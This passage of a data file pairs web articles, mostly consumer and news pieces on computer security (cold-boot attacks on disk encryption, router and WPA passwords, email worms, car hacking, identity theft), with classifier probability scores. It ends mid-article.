allowing SSI to execute system commands and CGI scripts. Therefore it is possible to lock that feature out with the Option IncludesNOEXEC instead of Option Includes in the access.conf file. All the other SSI commands will still work. For more information see the Apache mod_includes documentation that comes with the source. It is also available on the website at http://www.apache.org/docs/mod/mod_include.html. For a more detailed discussion of SSI/XSSI implementation see the Apacheweek feature at http://www.apacheweek.com/features/ssi. For more information on SSI commands see the NCSA documentation at http://hoohoo.ncsa.uiuc.edu/docs/tutorials/includes.html. For more information on XSSI commands goto ftp://pageplus.com/pub/hsf/xssi/xssi-1.1.html. Apache can be extended to support almost anything with modules. There are allot of modules already in existence. Only the general interest modules are included with Apache. For links to existing modules goto the Apache Module Registry at http://www.zyzzyva.com/module_registry/. For module programming information goto http://www.zyzzyva.com/module_registry/reference/",
        "prob": "tensor([[1.0127e-05, 9.9999e-01]])"
    },
    {
        "text": "MySQL has the advantage of containing several storage engines providing you with what is effectively several different types of databases in one software package. You install MySQL then choose MyISAM or InnoDB or one of the other storage engines. InnoDB became the default in MySQL 5.1. InnoDB is now the default database engine and is benefiting from the extra focus. MySQL 5.5 includes InnoDB enhancements to make better use of storage technology coupled with multiple processor cores. The main change splits a workload into two separate streams to let the workloads run on separate cores. Input/Output requests should start faster, producing more requests per second. You then need faster disks to serve those extra requests. There are several improvements to make better use of multiple core processors. You will not see a difference when you step up from 2 cores to 4 cores. The difference will be noticeable when you jump up to 12 cores, as provided in an AMD Operon chip. The improvement is created by splitting workloads into multiple streams to let them run in parallel. Some of the workloads are controlled by parameters you can set to fit your hardware. There is more statistical information recorded to help you tune the workloads. Benchmarks show there is little difference for 4 cores or less because there were already enough streams running in parallel. There is little benefit above 30 cores because there are not enough streams to service more cores. This is a bit like backing up your data with RAID 1. You get at least two copies. The process works when you replicate from a master database to some slaves. Think of a master database replicating updates to several slave databases to serve many Web servers. You commit a transaction on the master and the change is saved to the master before the transaction is completed. You have one safe copy. Then your master server dies and you have no safe copies. Try that again with semisynchronous replication. You commit the transaction. MySQL updates the master but does not tell you the transaction is finished. Instead it waits for one slave to take a copy of the update. When the slave has secured a copy of the update and replied to the master, the master tells your program the transaction is complete. The master server dies. You simply switch the slave to become the master and carry on with 100 percent of your data. This feature is definitely of value to people running transactions in a master/slave replication. MySQL installs easily on Windows if you have administrative access. There are 32 bit and 64 bit versions for automatic installation. Oracle own MySQL and Oracle sell a rebranded Red Hat Linux. MySQL is available for both. MySQL is also available in source code andgeneric forms for Linux and some Unixes. MySQL is not available in Deb format for automatic installation in Debian or derivatives of Debian including Ubuntu and Linux Mint. Some applications are also available in a PPA library for automatic download bypassing the Debian and Ubuntu releases. MySQL is not available in PPA form. There are promises to set up a PPA library and a Deb download and to fast track MySQL 5.5 into Debian.",
        "prob": "tensor([[0.0521, 0.9479]])"
    },
    {
        "text": "Attack on computer memory reveals vulnerability of widely used security systems Posted February 21, 2008; 11:42 a.m. A team of academic, industry and independent researchers has demonstrated a new class of computer attacks that compromise the contents of \"secure\" memory systems, particularly in laptops. The attacks overcome a broad set of security measures called \"disk encryption,\" which are meant to secure information stored in a computer's permanent memory. The researchers cracked several widely used technologies, including Microsoft's BitLocker, Apple's FileVault and Linux's dm-crypt, and described the attacks in a paper and video published on the Web Feb. 21. The team reports that these attacks are likely to be effective at cracking many other disk encryption systems because these technologies have architectural features in common. \"We've broken disk encryption products in exactly the case when they seem to be most important these days: laptops that contain sensitive corporate data or personal information about business customers,\" said Alex Halderman, a Ph.D. candidate in Princeton's computer science department. \"Unlike many security problems, this isn't a minor flaw; it is a fundamental limitation in the way these systems were designed.\" The attack is particularly effective against computers that are turned on but are locked, such as laptops that are in a \"sleep\" or hibernation mode. One effective countermeasure is to turn a computer off entirely, though in some cases even this does not provide protection. Halderman's Princeton collaborators included graduate students Nadia Heninger, William Clarkson, Joseph Calandrino and Ariel Feldman and Professor Edward Felten, the director of the Center for Information Technology Policy. The team also included Seth Schoen of the Electronic Frontier Foundation, William Paul of Wind River Systems and independent computer security researcher Jacob Appelbaum. Felten said the findings demonstrate the risks associated with recent high-profile laptop thefts, including a Veterans Administration computer containing information on 26 million veterans and a University of California-Berkeley laptop that contained information on more than 98,000 graduate students and others. While it is widely believed that disk encryption would protect sensitive information in instances like these, the new research demonstrates that the information could easily be read even when data is encrypted. \"Disk encryption is often recommended as a magic bullet against the loss of private data on laptops,\" Felten said. \"Our results show that disk encryption provides less protection than previously thought. Even encrypted data can be vulnerable if an intruder gets access to the laptop.\" The new attacks exploit the fact that information stored in a computer's temporary working memory, or RAM, does not disappear immediately when a computer is shut off or when the memory chip is taken from the machine, as is commonly thought. Under normal circumstances, the data gradually decays over a period of several seconds to a minute. The process can be slowed considerably using simple techniques to cool the chips to low temperatures. Disk encryption technologies rely on the use of secret keys -- essentially large random numbers -- to encode and protect information. Computers need these keys to access files stored on their own hard disks or other storage systems. Once an authorized user has typed in a password, computers typically store the keys in the temporary RAM so that protected information can be accessed regularly. The keys are meant to disappear as soon as the RAM chips lose power. The team wrote programs that gained access to essential encryption information automatically after cutting power to machines and rebooting them. The method worked when the attackers had physical access to the computer and when they accessed it remotely over a computer network. The attack even worked when the encryption key had already started to decay, because the researchers were able to reconstruct it from multiple derivative keys that were also stored in memory. In one extremely powerful version of the attack, they were able to obtain the correct encryption data even when the memory chip was physically removed from one computer and placed in another machine. After obtaining the encryption key, they could then easily access all information on the original machine. \"This method is extremely resistant to countermeasures that defensive programs on the original computer might try to take,\" Halderman said. The attacks demonstrate the vulnerability of machines when they are in an active state, including \"sleep mode\" or the \"screen lock\" mode that laptops enter when their covers are shut. Even though the machines require a password to unlock the screen, the encryption keys are already located in the RAM, which provides an opportunity for attackers with malicious intent. None of the attacks required specialized equipment. \"I think we're going to see attackers doing things that people have previously though impractical or impossible,\" Appelbaum said. The researchers were able to extend the life of the information in RAM by cooling it using readily available \"canned air\" keyboard dusting products. When turned upside down, these canisters spray very cold liquid. Discharging the cold liquid onto a memory chip, the researchers were able to lower the temperature of the memory to -50 degrees Celsius. This slowed the decay rates enough that an attacker who cut power for 10 minutes would still be able to recover 99.9 percent of the information in the RAM correctly. \"Hints of problems associated with computers retaining their temporary memory have appeared in the scientific literature, but this is the first systematic examination of the security implications,\" said Schoen. The researchers posted the paper describing their findings on the website of Princeton's Center for Information Technology Policy. They submitted the paper for publication and it is currently undergoing review. In the meantime, the researchers have contacted several manufacturers to make them aware of the vulnerability: Microsoft, which includes BitLocker in some versions of Windows Vista; Apple, which created FileVault; and the makers of dm-crypt and TrueCrypt, which are open-source products for Windows and Linux platforms. \"There's not much they can do at this point,\" Halderman said. \"In the short term, they can warn their customers about the vulnerability and tell them to shut their computers down completely when traveling.\" In the longer term, Halderman said new technologies may need to be designed that do not require the storing of encryption keys in the RAM, given its inherent vulnerability. The researchers plan to continue investigating this and other defenses against this new security threat.",
        "prob": "tensor([[2.0381e-06, 1.0000e+00]])"
    },
    {
        "text": "A Tale of Two Passwords March 05, 2008 Learn the secrets to savvy password creation. There's no two ways about itpasswords can be a pain in the...well, you know. Most people would avoid dealing with them if they could and thus engage in some bad password habits, like creating overly simplistic passwords (plus using the same password for everything) and failing to change default passwords. On your broadband router, there are two passwords in particular, that when set improperly, can leave your network vulnerable. Router Administration Password This is a password that's commonly overlooked. Given that people may seldom need to access the router's settings beyond an initial configuration, many either inadvertently or intentionally leave the password at its factory default value, which is usually the manufacturer's name, \"password,\" \"1234\" or sometimes even no password at all. Last year, some security researchers effectively invented and documented this kind of attack. In a nutshell, code embedded in a Web page or e-mail message is used to remotely log into a router using a known default password. (The default password for almost any brand and model of router is easily looked up online. See for yourself at www.routerpasswords.com, which is just one site among many.) In drive-by pharming, once granted access to the router, an attacker can then configure it to use the attacker's own DNS servers not unlike how we configured a router to use OpenDNS a few weeks back and from there exercise total control over which sites the user is taken to. (For a narrated animation describing how a drive-by pharming attack works, check out www.symantec.com/enterprise/security_response/weblog/upload/2007/02/db-pharming.html.) What was once a theoretical risk has (perhaps inevitably) become a very real one. According to Symantec security researcher Zulfikar Ramzanone of the researchers who originally discovered and documented the attack drive-by pharming has now just been spotted \"in the wild\", which means it's actually been done in the real world as opposed to just in a computer lab. It was in Mexico, to be specific, where it was used to redirect folks using a specific router to a faux Web site posing as that of a major bank. (Read a detailed description on Ramzan's blog.) Long story short, if you're one of those that forgot to change your router's password or didn't think you needed to, now is an excellent time to log you're your router and correct that mistake. If you don't know your router's default password offhand, you'll very likely find it on the site mentioned above. Another router-based password that you'll want to take a close look at is the one you use to WPA-encrypt your wireless network. Those in the know wisely choose WPA over WEP because of the superior security it can provide, but this isn't automatic the password you create will directly affect the level of protection you receive. Case in point: a WPA password can be as short as 8 characters or as long as 63, but as with all passwords, there's a tendency to use the shortest and easiest to remember WPA password possible. People commonly set up WPA passwords that are dictionary words or proper names of family members or pets, because it must be typed into every device on their wireless networks. One of the reasons WEP is so weak is because it uses a static encryption key which can eventually be decoded if you monitor the network long enoughoften for just hours or minutes. WPA is better because it uses the password you specify to generate a constantly-changing series of encryption keys. But all those keys are still derived from that single WPA password (also known as the Pre-Shared Key, or PSK), so a longer and more complex password will produce keys that are stronger and harder to decode. Put another way, a lengthy WPA password made up of random characters is far preferable to something like \"samandmary\". If you're using such a short-and-simple WPA key, it's highly advisable that you change it. Don't despair about having come up with a long complicated password, though, because there are Web sites that can help. You can head over to www.passpub.com/wpa256.php to grab an instant 52 character key, or generate a custom-length password at www.kurtm.net/wpa-pskgen/. (The former site sends your key over an SSL-encrypted connection, while the latter generates it directly on your computer, so there's no danger of eavesdropping.) And yes, you will have the inconvenience of entering your newly long and cumbersome key at each of your wireless computers. But you'll only have to do it once, and it's a small price to pay for better security. These days, you can't be too careful. Story courtesy of PracticallyNetworked. Joe Moran is a regular contributor to PracticallyNetworked. To learn more about WPA, read \"The Wi-FiPlanet Guide to WPA.\"",
        "prob": "tensor([[2.0596e-06, 1.0000e+00]])"
    },
    {
        "text": "Parents, teachers, non-profits, government, and industry have been working hard to protect kids online. However, we also need to think about protecting the Internet from kids who might abuse it. The Department of Justice categorizes computer crime in three ways: - The computer as a target - attacking the computers of others (spreading viruses is an example). - The computer as a weapon - using a computer to commit \"traditional crime\" that we see in the physical world (such as fraud or illegal gambling). - The computer as an accessory - using a computer as a \"fancy filing cabinet\" to store illegal or stolen information. Reports of alleged computer crime have been a hot news item of late. Especially alarming is the realization that many of the masterminds behind these criminal acts are mere kids. In fact, children no longer need to be highly skilled in order to execute cyber crimes. \"Hacker tools\" are easily available on the Net and, once downloaded, can be used by even novice computer users. This greatly expands the population of possible wrongdoers. Children (and in some cases - their parents) often think that shutting down or defacing Web sites or releasing network viruses are amusing pranks. Kids might not even realize that what they are doing is illegal. Still other kids might find themselves hanging out online with skilled hackers who share hacking tools with them and encourage them to do inappropriate things online. Unfortunately, some of these kids don't realize that they are committing crimes until it is too late. Even more distressing and difficult to combat is the fact that some in the media portray the computer criminal as a modern day Robin Hood. Nothing could be further from the truth. So what are cyber crimes? Can the law enforcement authorities find criminals online? How can you create context for your children to understand what cyber crimes are? The following information (and areas throughout the site) will help familiarize you with unethical and illegal online behavior. Additionally, to learn more about cyber crime, visit the Department of Justice Computer Crime & Intellectual Property Section's website at www.cybercrime.gov. The Computer Emergency Response Team (CERT) at www.cert.org and the National Infrastructure Protection Center at the FBI at www.infragard.net provides regularly updated information and descriptions of cyber crimes.",
        "prob": "tensor([[3.6777e-04, 9.9963e-01]])"
    },
    {
        "text": "Digital Makeover: Learn How to Protect Yourself Against Viruses and Malware #30DaysofGOOD Last week, computer-security company McAfee released its latest research on malware, spam, and viruses (pdf). The new data paints a dismal picture, showing the largest surge in cyberattacks to occur in four years. McAfee says it has identified more than 8 million new types of malicious software in the past few months alone. And unlike in previous years, these threats aren't limited to only PC users. \"Attacks that we've traditionally seen on PCs are now making their way to other devices,\" said Vincent Weafer, head of McAfee Labs. \"This report highlights the need for protection on all devices that may be used to access the Internet.\" Today's task is to learn how to protect yourself and your digital devices against viruses, bugs, worms, and other Internet nasties. Like we said when we talked about the need for creating better passwords, there may not be a way to fully guarantee online safety, but there are several things you can do to reduce the likelihood that you'll be the victim of malware. The FBI offers a basic (but quite valuable) guide to protecting your computer, with tips for using firewall software and keeping your operating system up to date, plus suggestions for safer web surfing. Although Windows IT Pro generally focuses on tech solutions for the professional IT community, the site also has some great resources for average users like you and me. This directory of free programs for keeping your Windows PC secure includes web-based tools, browser plug-ins, and downloadable software. If you're a Mac user, take a look at Wired's guide to checking for malware. It's part of Wired's collaborative How-To project; since it's in wiki form, you can make edits and add your own Mac security tips. FInally, be sure to bookmark PCWorld's recent article about protecting your smartphones and tablets. It's got explanations of all the different online threats, and offers practical tips for finding a comprehensive security solution for your specific collection of devices.",
        "prob": "tensor([[2.1587e-06, 1.0000e+00]])"
    },
    {
        "text": "Every computer that is connected in some way to the internet should be running software designed to protect the system from the numerous security risks that are easily encountered in \"cyberspace\". In a perfect world, this would be all that the user would need to do to protect a computer from viruses and spyware. Unfortunately, due to the dynamic nature of the internet, and the almost constant proliferation of new bugs, viruses, and spyware, even the best anti-virus software will never be able to provide 100% protection for your computer. The following is a guide that provides basic maintenance and troubleshooting steps that the general user can use to cleanup and safeguard their system. - First, as stated, make sure that you are running the most current updates for an anti-virus software package. If you do not have software of this type on your computer, a good freeware anti-virus program is AVG Antivirus, which is free to individual users for home/dorm-use. Although most reputable anti-virus applications will automatically download current updates, in the end it is the user's responsibility to make sure that software is current. Updates should be performed at least once a week. This is (as mentioned earlier) crucial to the effectiveness of the software, because new security risks arise daily. (It is also imperative that all Windows Security Updates and Service Packs be installed, especially Service Pack 2 with the Firewall enabled.) In addition to anti-virus software, most people will also want to run anti-spyware/adware applications on their computer. While not necessarily malicious, spyware and adware nevertheless pose a serious risk to your personal information. The majority of these programs are downloaded in conjunction with free software that the user has installed on his or her computer, but some are bundled with more \"reputable\" programs that the user has paid for! Adware and spyware usually run totally unnoticed in the background, \"mining\" the user's personal information and at the very least using up system resources. Spybot Search & Destroy and AdAware are two software packages that are excellent for screening your system for adware and spyware. Be aware, however, that most of the time \"free\" software will be disabled if the adware/spyware associated with it is eliminated. A few software packages that are notorious for bundling malware are: - Kazaa, Morpheus, iMesh, BearShare, (and any number of other \"Peer-to-peer\" file sharing programs.): Peer to peer (or \"P2P\") file sharing puts your computer at the highest risk for infection. In addition to this, most \"free\" P2P applications of this type come bundled with adware that cannot be disabled without disabling the P2P application as well. - RealPlayer: a media player that is (unfortunately) the only player able to play A/V files with extension \".rm\" Unless a user has a very pressing need to view files of this type, it is strongly recommended that this application be avoided. After running updated malware removal software on your computer, you can also check your (Windows) system directly. - Pressing Ctrl-Alt-Delete at the same time will bring up the Windows-Security Menu. - Click on the Task Manager button. - Choosing the Processes Tab will display a full list of all processes that are currently running on the computer. Running a check on google using the name of any of these processes (svchost.exe, for example) should display any number of websites that will reveal what the process's job is. If the process has something to do with malware, your web-search will most likely find some sites that will not only tell you what the process is doing, but should also contain instructions on removing the problem. If you suspect that a process may be suspect, you can also go directly to an antivirus website such as Symantec or Sophos, and search their online database directly for information. - Though all these steps go a long way toward keeping your system secure, new security threats are always popping up, and \"hackers\" can be quite ingenious when it comes to finding ways to bury their code in your system. If the steps listed above don't seem to be helping, don't be afraid to ask for help from the CIS Helpdesk, at x77777.",
        "prob": "tensor([[2.1023e-06, 1.0000e+00]])"
    },
    {
        "text": "DDoS: in depth Distributed Denial of Service Attacks have recently emerged as one of the most newsworthy, if not the greatest, weaknesses of the Internet. Overview Distributed Denial of Service (DDoS) attacks are a relatively new development; reports of the first DDoS attacks surfaced in mid-1999, with the highest-profile attacks coming in early 2000 against sites like Amazon.com, CNN.com, eBay and E-Trade. Clearly, the challenge these attacks present is a serious one. While you alone can't do much to protect yourself, as a community we can improve the situation. The victims were unreachable for several hours each. A brief note on usage: the network where these attacks are taking place is called the ``Internet'', with a capital ``I''; it is the public network shared by people all over the world. An ``internet'', with a lower-case ``i'', is a collection of networks interconnected; many organizations have private internets. The Internet is the result of inter-connecting a gigantic number of private internets. [ Read more ] By subscribing to our early morning news update, you will receive a daily digest of the latest security news published on Help Net Security. With over 500 issues so far, reading our newsletter every Monday morning will keep you up-to-date with security risks out there.",
        "prob": "tensor([[2.0229e-06, 1.0000e+00]])"
    },
    {
        "text": "Our passwords give us access to a number of very valuable resources. They control access to our bank accounts, photos of our families, email correspondence, and all kinds of other information. As valuable as all this information is, it is amazing how little effort most people put into making sure they have good passwords. Here are six password resolutions for 2009 to help protect your data with more secure passwords. 1. Resolve to use different passwords on each website. There are a few ways to do this. The most secure is to use a completely different randomly generated password on each site. If you use a password management program like 1Passwd this isn’t too difficult. Another option is to create a scheme that allows you to modify your password slightly based on each site. For example, if you use a base password of $5*9twoop, you could use $5*9twoop6 for Amazon.com, $5*9twoop5 for Yahoo.com and $5*9twoop3 for wsj.com. The last number is just the number of characters in the domain name that comes before the .com of each site. This doesn’t make for the most secure passwords, but if some website is hacked or someone gets one of your passwords they won’t automatically have all of your password for every site. 2. Resolve to use longer passwords. There are two types of brute force approaches to cracking passwords. One is to try every possible combination of letters in sequence. For example, trying every three letter password would look like: aaa, aab, aac, aad, etc. Another common approach is to use a dictionary and just try common words that might be used as a password. Unless you are using a dictionary word, an eight character password is going to be much more difficult to break than a six character one. I’ve started using passwords that are over 10 characters long. We will talk about passphrases in a minute as a way to accomplish this. 3. Resolve to keep password lists encrypted. If you use a different password for every site, you will probably need to keep a record of them somewhere–particularly if you use completely random passwords and not some scheme like we mentioned in point one. If you use password management software, it may support automatic encryption. If you just keep them in a text file, you will need to investigate other encryption methods. 4. Resolve to use random symbols in passwords. Passwords that have symbols (like *#&@!) are much more difficult to break using a brute force attack. Along the same lines you should make sure you can use both capital and lower case letters. 5. Resolve to use passphrases. Passwords like The^funny@clown! are much more secure than a password like clown99 or Cl()wn simply because they are longer. With a phrase, you get a memorable password while increasing the length considerably. 6. Resolve to password protect your computer. If the average computer is stolen, simply turning it on will get you access to everything on the hard drive. At the very least, you laptop should prompt you for a password when you boot it and when it comes out of sleep mode. This doesn’t protect the hard drive like encrypting all of your data, but if a thief is after your hardware (not your data) they will probably just reinstall the OS to sell the machine. If they immediately have access to all your data, you significantly increase your chances of them poking around a bit to see if they can find any valuable information before selling it.",
        "prob": "tensor([[2.1177e-06, 1.0000e+00]])"
    },
    {
        "text": "Internal security is a longstanding issue on the political agenda, and governments provide well for it. Two issues have recently provided challenges to internal security policy. First, extremist right- and left-wing activities are an increasing problem, arising mainly but not exclusively in the federal states of the former East Germany. Second, fighting terrorist and extremist activities has emerged as both a domestic and international phenomenon. Recent events have clearly demonstrated that even small terrorist groups of Islamic fundamentalists are able to paralyze the whole security system for weeks at a time. Today, internal security policy is closely intertwined with EU strategies and policies. Due to the events of 9/11 and its effects on the subsequent “war on terrorism,” former Minister of the Interior Wolfgang Schäuble focused on policies strengthening internal security in order to prevent future terrorist attacks. In 2007, there was a debate on data retention, with policy mandating the storage of all phone and Internet communications for six months. In Germany, the government implemented an EU policy on data retention, but this law was overturned by the Federal Constitutional Court in March 2010. Another law enables the police forces of the Federal Criminal Police Office to implement preventive measures against terrorism, including monitoring private communications via personal computers or telephones, and observing individuals with video cameras. There has also been some debate over how the military forces could be used domestically to prevent terrorist attacks, an idea that was ultimately dropped. In 2009, the EU Commission recommended the implementation of body scanners at European airports to increase safety. Most European governments initially refused to use them, but another failed attack would probably lead the scanners to be implemented soon. Generally, the relationship between security and freedom consistently drives heated and controversial discussions. Nonetheless, authorities have so far been successful in preventing major terrorist attacks, at times by detecting conspiracies at an early stage. Fischer Weltalmanach 2009 http://ww w.bmi.bund.de/cln_174/SharedDocs/Re den/DE/2010/01/rede_bt.html http:/ /www.bmi.bund.de/cln_174/SharedDocs /Pressemitteilungen/DE/2010/03/politisch_motivierte_kriminalitaet.html ?nn=303936 Busch, Andreas, 2010: Kontinuität statt Wandel: Die Innen- und Rechtspolitik der Großen Koalition, in: Christoph Egle/Reimut Zohlnhöfer (eds): Die zweite Große Koalition. Eine Bilanz der Regierung Merkel, 2005-2009, Wiesbaden: VS.",
        "prob": "tensor([[0.0136, 0.9864]])"
    },
    {
        "text": "|By K. Thor Jensen May 5, 2011| As email began to become the preferred method of business communication, it became only natural for virus makers to start treating it as a disease vector. One of the first worms to get major attention was the Melissa virus, created in 1999 by David L. Smith and named after a stripper he had a crush on. Sent through an email, it was built on a simple Microsoft Word macro - if you opened the attached document, it would automatically replicate itself and re-send to the top 50 names in your address book. Melissa crashed multiple networks before it was contained, but it was only the beginning. As more and more people started using email in their daily life, it's not surprising that virus makers are targeting kids with their work as well. The 2007 Pikachu worm is widely regarded to be the first piece of malware that focused on the pre-teen set. An email containing an image of the electric mouse Pokemon and some amazing Engrish reading \"Between millions of people around the world I found you. Don't forget to remember this day every time MY FRIEND.\" led to a mass email to everybody in your address book as well as the addition of instructions to your autoexec.bat file that would wipe your hard drive on next boot. One of the most devastating aspects of viruses is how they can lay dormant in your computer waiting for further instructions. The first virus to really create a worldwide panic was dubbed Michelangelo after its date of activation - on March 6th, the famous painter's birthday, this malicious bit of code would roar into action and delete the first 100 sectors of your hard drive, rendering your machine inoperative. Things got really crazy when it was discovered that some hardware manufacturers including Intel had shipped products that were accidentally pre-infected with the virus, and the media actually advised people to not turn their computers on at all on the 6th until a cure could be found.",
        "prob": "tensor([[0.0044, 0.9956]])"
    },
    {
        "text": "Experts Want To Keep Your Car’s Computer Safe From Attack Michael Harper for redOrbit.com – Your Universe Online A virus on a computer can be bad enough, possibly leading to hacked accounts and even broken hardware. A virus on your car’s computer however, could be downright dangerous. As our world progresses, so too does our desire to computerize everything, and our cars have become quite advanced. Staying one step ahead, the McAfee team at Intel Corp has been working away in a very unusual office for computer programmers and hackers: a West Coast garage. McAfee, makers of the popular anti-virus software, are just one of the teams looking to protect automobiles from many bugs and viruses which could wreak havoc on the tiny computers inside modern cars. As the cars become increasingly advanced and the technology becomes cheaper, more and more of these wide open and vulnerable computers are driving freely on our Nation’s interstates, freeways and city streets. According to some experts, many automakers have yet to address the issue, giving hackers the ability to not only eavesdrop, but also steal cars and potentially cause them to crash into one another. Though there have yet to be any violent attacks on car computers reported, companies like Intel’s McAfee and even Ford Motor Company aren’t waiting for the hackers to strike first. “Ford is taking the threat very seriously and investing in security solutions that are built into the product from the outset,” said Alan Hall, a spokesman for Ford. According to Hall, his company has given their security engineers the job of making their Sync in-vehicle offerings as imperceptible to hacking attacks as possible. In 2010, a group of computer scientists from the US showed the automobile just how dangerous a virus on a car’s computer could be when they took control and damaged some cars moving at high speeds at a decommissioned airport. After this exhibit, SAE International, an association of more than 128,000 automobile and aerospace technicians, tasked a committee with advising automobile manufacturers on how to not only detect attacks on their automobiles, but also to prevent infiltrations. “Any cyber security breach carries certain risk,” said Jack Pokrzywa, SAE’s manager of ground vehicle standards, speaking to Reuters. “SAE Vehicle Electrical System Security Committee is working hard to develop specifications which will reduce that risk in the vehicle area.” The same group of computer scientists who presented that harrowing demonstration in 2010 issued a second report last year, this time saying automobiles can also be susceptible to trojans and worms via their onboard diagnostic systems and even CD players. A hacker disguised as a technician, or a technician turned hacker, could place one of these viruses on a seemingly innocuous plug and install the virus all while appearing to be checking the system’s emissions. Though the group of scientists did not mention specifically which car manufacturers they used to demonstrate these security vulnerabilities, they told Reuters that all cars were in danger of being hacked, especially when considering that most of these automakers use the same development processes and suppliers. The world’s largest automaker, Toyota Motor Corp, seems confident in their offerings, saying they haven’t heard of any hacking attacks on their cars. “They’re basically designed to change coding constantly. I won’t say it’s impossible to hack, but it’s pretty close,” said John Hanson, a spokesman for Toyota. Later, Hanson said, “Viruses are something that needs to be addressed directly. How we guard against that transfer to our system is a primary focus of our efforts.”",
        "prob": "tensor([[2.0741e-06, 1.0000e+00]])"
    },
    {
        "text": "« More News Stories June 8, 2012—Having successfully coordinated projects that resulted in secure coding standards for the C, C++, and Java programming languages, the CERT Secure Coding Initiative has unveiled work on a draft standard for Perl. The members of the CERT Secure Coding Team have analyzed thousands of vulnerability reports, including reports produced by the CERT Vulnerability Analysis Team, to identify insecure coding practices in Perl. From this analysis, the team has developed the draft Perl secure coding standard. The goal for the standard is to provide software developers with a tool for reducing or eliminating vulnerabilities before deployment. This work is being sponsored by the Department of Homeland Security, Network Security Deployment Division. “In our analysis, we performed Perl code audits using the Source Code Analysis Lab (SCALe),” said the Secure Coding Team’s David Svoboda. “Our audit process presupposes a secure coding standard. So, auditing Perl code required us to have a draft standard, which also served as a nascent set of issues. That is, many of our rules were inspired by vulnerabilities in the code we analyzed.” Most software vulnerabilities stem from a relatively small number of common programming errors. Coding standards encourage programmers to follow a uniform set of rules and guidelines determined by the requirements of the project and organization, rather than by the programmer's familiarity or preference. Once established, these standards can be used as a metric to manually or automatically evaluate source code. The draft CERT Perl Secure Coding Standard provides a core of well-documented and enforceable coding rules and recommendations for the Perl programming language. Developing this core of draft rules into a comprehensive standard can help programmers realize significant security improvements in a variety of programming contexts. “Perl is the most prominent scripting language in the Unix world,” noted Svoboda. “It predates other scripting languages like PHP, Python, and Ruby.” To augment the standard, the CERT Program invites collaboration from interested professionals in the software development and software security communities. As with all of the Secure Coding Team’s standards work, the goal of this project is to eliminate insecure coding practices that can lead to exploitable vulnerabilities. Its application will lead to higher-quality systems that are more robust and resistant to attack. To get involved, software development professionals should visit www.securecoding.cert.org, create an account, sign in, and start commenting on the rules. For more information on the CERT Secure Coding Standard for Perl, please visit www.securecoding.cert.org/confluence/display/perl/CERT+Perl+Secure+Coding+Standard.",
        "prob": "tensor([[2.0439e-06, 1.0000e+00]])"
    },
    {
        "text": "Most kids associate October with the scares related to the traditional Halloween standbys – ghosts, witches, and zombies. But, the month also marks National Cyber Security Awareness month, calling attention to frightening things like online identity theft, cyber bullying, viruses and damaging malware. If your teen is among the 93 percent of 12 to 17-year-olds using your family’s laptop, smartphone or tablet to surf the Internet, they are vulnerable to multiple cyber threats, many of which could be detrimental. Moreover, teens do not realize the abundance of threats awaiting them, nor do they recognize a tweet or photo upload can impact not only their reputation and future, but their safety, as well. Microsoft’s research shows that 55 percent of teens say they give little or no thought to the consequences of posting something online. And, according to a recent survey, 1 in 4 parents are overwhelmed by technology and just hope for the best. “As hackers continue plotting attacks, the increase in vulnerability among teens is likely, but parents may not realize they are actually the first line of defense in keeping their families safe online,” says Linda McCarthy, cyber security expert, former senior director of internet safety at Symantec and author of “Own Your Space: Keep Yourself and Your Stuff Safe Online.” The increase in prospective cyber threats provides opportunities in the career field of cyber security. If your teen enjoys spending time online, it’s never too early to begin discussing the education required to enter this field. According to the U.S. Bureau of Labor Statistics, cyber security related fields are projected to grow more than 28 percent by 2020. DeVry University, which has partnered with McCarthy to provide complimentary copies of the “Own Your Space” eBook to parents, teachers and teens, recognizes the growing need for professionals with the skills required to protect individuals and organizations from cyber-attacks. By also partnering with technology leaders like Cisco and Microsoft, its students are provided with a mix of relevant theoretical and hands-on education. Cyber security is a moving target, and as threats develop daily, it’s imperative for parents and teachers to educate teens about these dangers. “The goal is to inform and educate teens, not scare them about the dangers of sharing information online,” says McCarthy. “By protecting your family’s devices and empowering teens with the information needed to recognize impending threats, cyber sabotage is avoidable.” Download the eBook by clicking on the cover image below. You can also download a complimentary copy of the official Facebook Security Guide here.",
        "prob": "tensor([[2.0733e-06, 1.0000e+00]])"
    },
    {
        "text": "I know many of you have new computers in your homes, but how many of you realize that this computer is already vulnerable? How can this be? How can a brand new computer be vulnerable? There are many reasons for this: - Most computers have insecure default configurations. - Your software is probably already outdated. New vulnerabilities have likely been discovered between the time the computer was built and configured by the manufacturer and the day you power on your new system. - Numerous viruses and worms are already circulating on the Internet capable of taking advantage of the latest vulnerabilities. - Hackers know where you are! They regularly scan the common broadband and dial-up IP address ranges. Before You Connect Let's talk about what you should do before you connect this new system to the Internet. You should not connect your computer directly to the Internet. You should, instead, use a network firewall or firewall router. A network firewall or firewall router is a hardware device that users can install between the computers on their Local Area Network (LAN) and their broadband device (cable/DSL modem). By blocking inbound access to the computers on the LAN from the Internet at large (yet still allowing the LAN computers' outbound access), a hardware-based firewall can often provide sufficient protection for a user to complete the downloading and installation of necessary software patches. A hardware-based firewall provides a high degree of protection for new computers being brought online. If you're running Windows XP (and if this is a new system, you probably are) you enable the Internet Connection Firewall (ICF). Microsoft has provided instructions for enabling the built-in Internet Connection Firewall on Windows XP. By subscribing to our early morning news update, you will receive a daily digest of the latest security news published on Help Net Security. With over 500 issues so far, reading our newsletter every Monday morning will keep you up-to-date with security risks out there.",
        "prob": "tensor([[0.0016, 0.9984]])"
    },
    {
        "text": "Do you know your child could be a target for identity theft? (BPT) - Imagine that you've taught your child everything they need to know about personal finance. Then as he's getting ready to head off to college and applies for financial aid, he's unexpectedly rejected for financial aid due to poor credit. Yet he's never applied for credit in his life. Sounds outrageous, doesn't it? But this can happen to victims of child identity theft Most Americans are aware that identity theft is a significant problem, and that it's important to take measures to protect your identity. What people might not know is their children may also be targets of identity theft before they even become old enough to own a credit card. The Federal Trade Commission has identified child identity theft as a growing problem and encourages parents to do what they can to minimize the risks to their children. How does it happen? The most common way a criminal can steal or misuse the identity of a child is to get access to the child's Social Security number. The perpetrator then uses the Social Security number to open credit card accounts or loans, rent an apartment, sign up for utilities like cell phone service, or even apply for a job. Credit issuers often don't have a way to verify the age of the applicant, so if the criminal changes the age of the identity associated with your child, it's possible that the issuer may approve them for credit, according to the Identity Theft Resource Center Once an account has been established in your child's name, it's easier for criminals to establish subsequent accounts until this fraud is discovered. If your child's identity is stolen at an early age and the theft goes undiscovered until she reaches the age where she begins to establish her own credit, it can be very difficult to discover how the fraud first occurred. How can you help prevent it? Parents can take a number of steps to help prevent their children from becoming identity theft victims: * Store your children's Social Security cards in a safe place like a safety deposit box. Only 